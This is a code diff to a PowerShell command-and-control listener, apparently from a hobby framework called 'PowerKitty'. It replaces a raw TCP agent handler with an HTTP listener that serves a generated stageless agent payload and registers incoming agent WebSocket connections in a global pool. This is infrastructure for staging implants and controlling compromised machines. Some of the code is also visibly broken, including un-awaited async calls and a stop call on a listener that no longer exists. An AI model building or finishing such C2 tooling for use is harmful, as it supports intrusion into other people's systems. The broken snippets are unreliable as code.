@@ -13,18 +13,14 @@ Function Global:New-Listerner()
 
 		[Parameter()]
 		[ValidateRange(1, 65535)]
-		[INT]$LPORT,
+		[int]$LPORT,
 
 		[Parameter()]
 		[String]$PSK,
 
 		[Parameter()]
 		[ValidateSet("Staged","Stageless")]
-		[String]$StageType,
-
-		[Parameter()]
-		[ValidateRange(1, 65535)]
-		[String]$StageLPORT = 80
+		[String]$StageType
 
 	)
 
@@ -48,7 +44,7 @@ Function Global:New-Listerner()
 		Name       = [String]$ListerName
 		UUID       = [String](New-Guid).Guid
 		LHOST      = [system.net.ipaddress]$LHOST
-		LPORT      = [INT]$LPORT
+		LPORT      = [int]$LPORT
 		RAWSOCK    = [Collections.Generic.List[Object]]$listener
 		isStaged   = $false
 		PSK        = $PSK
@@ -59,85 +55,28 @@ Function Global:New-Listerner()
 	# add a runspace here (yes we are nesting)
 	# add it once the listerner works. when its working, we can shove it into the background so the powershell terminal is free again.
 
-	# setup stager http server
-	if($StageType = "Staged")
-	{
-		$obj.isStaged = $true
+	$http = [System.Net.HttpListener]::new() 
+	$http.Prefixes.Add("http://$LHOST`:$LPORT/")
+	$http.Start()
 
-		$http = [System.Net.HttpListener]::new() 
-		$http.Prefixes.Add("http://$LHOST`:$StageLPORT/")
-		$http.Start()
+	while ($http.IsListening) {
 
-		while ($http.IsListening) {
-
-			# Get Request Url
-			# When a request is made in a web browser the GetContext() method will return a request object
-			# Our route examples below will use the request object properties to decide how to respond
-			$context = $http.GetContext()
-
-
-			# ROUTE http://localhost:80/onboard
-			# 
-			if ($context.Request.HttpMethod -eq 'GET' -and $context.Request.RawUrl -eq '/onboard') {
-
-				# We can log the request to the terminal
-				write-host "$($context.Request.UserHostAddress)  =>  $($context.Request.Url)" -f 'mag'
-
-				# the html/data you want to send to the browser
-				# we generate a 
-				[string]$html = (New-Agent -Listerner $obj -StageType Stageless).toString()
-        
-				#resposed to the request
-				$buffer = [System.Text.Encoding]::UTF8.GetBytes($html) # convert htmtl to bytes
-				$context.Response.ContentLength64 = $buffer.Length
-				$context.Response.OutputStream.Write($buffer, 0, $buffer.Length) #stream to broswer
-				$context.Response.OutputStream.Close() # close the response
-    
-			}
-	}
-
-
-
-	# continue accepting socket connections until object no longer exists
-	while(Get-Listerner -UUID ($obj.UUID))
-	{
-		
-		if($client = $listener.AcceptTcpClient())
+		# Get Request Url
+		# When a request is made in a web browser the GetContext() method will return a request object
+		# Our route examples below will use the request object properties to decide how to respond
+		$context = $http.GetContext()
+		if($context.Request.IsWebSocketRequest)
 		{
+			# handle websocket (second stage)
+			write-host "Agent connection: $($context.Request.UserHostAddress)  =>  $($context.Request.Url)" -f 'mag'
+
+			[System.Net.WebSockets.WebSocket]  $ws = $context.AcceptWebSocketAsync()
 			
-			"sock!"
-
-			$Stream = $client.GetStream()
-			$StreamWriter = New-Object System.IO.StreamWriter($Stream)
-			$StreamWriter.AutoFlush = $true
-			$StreamReader = New-Object System.IO.StreamReader($Stream)
-
-	
-			# wait for message
-			while(!$Stream.DataAvailable)
-			{
-				# TODO: we need a way here to timeout, to not allow for denial of service
-				Start-Sleep -Milliseconds 100
-			}
-
-
-			$agentmessage = $StreamReader.ReadLine()
-			
-			if($agentmessage -eq $PSK + "onboard")
-			{
-				<#
-
-				porting this to http listerner
-
-				# agent checkign in for the first time
-				# add new agent here
-
-				$Agent = [PSCustomObject]@{
+			$Agent = [PSCustomObject]@{
 					# required information
 					UUID             = (New-Guid).Guid
-					RAWConnection    = [PSObject]$client
-					LHOST            = $obj.LHOST
-					LPORT            = $obj.LPORT
+					RAWConnection    = [Object]$ws
+					AGENTIP          = $context.Request.RemoteEndPoint.Address.ToString()
 
 					# information enumerated
 					ComputerName     = [String]""
@@ -145,51 +84,40 @@ Function Global:New-Listerner()
 					LastSeen         = [String](get-date)
 					ExecutionPath    = [String]""
 					ExecutionContext = [String]""
-
+					
+					#Make these methods. so we can call Agent.SendData() or something.
 					# rsults sent back from commands
 					ResponseQueue     = @()
 
 					# objects to interact with
-					StreamReader     = $StreamReader 
-					StreamWriter     = $StreamWriter
+					StreamReader     = $ws.ReceiveAsync()
+					StreamWriter     = $ws.SendAsync()
 				}
 				
 				$Global:AgentPool += $Agent
-				#>
 
 
 		}
+		if($context.Request.HttpMethod -eq 'GET' -and $context.Request.RawUrl -eq '/')
+		{
+			# handle http get request (first stage)
+			write-host "Staging: $($context.Request.UserHostAddress)  =>  $($context.Request.Url)" -f 'mag'
+		    [string] $html = (New-Agent -Listerner $obj -StageType Stageless).toString()
 
-
-			}
-			elseif($agentmessage -eq $PSK + "checkin")
-			{
-				# check UID, and update agent with this UID
-				# we probably need to serialize our messgaes here, and update all agent details with the correct 
-
-			}
-			# else, gtfo
-			else
-			{
-				$agentmessage
-				$StreamWriter.WriteLine("PowerKitty: Hisss!!!") | Out-Null
-			}
-
-				
-			#$StreamWriter.Close()
-			$StreamReader.Close()
-
-
-
-			
-
+			#resposed to the request
+			$buffer = [System.Text.Encoding]::UTF8.GetBytes($html) # convert htmtl to bytes
+			$context.Response.ContentLength64 = $buffer.Length
+			$context.Response.OutputStream.Write($buffer, 0, $buffer.Length) #stream to broswer
+			$context.Response.OutputStream.Close() # close the response
 		}
+
 		
-		# small sleep to not thrash CPU
-	    Start-Sleep -Milliseconds 100
 		
 	}
+
+
 	$listener.Stop();
+
 	
 
 }
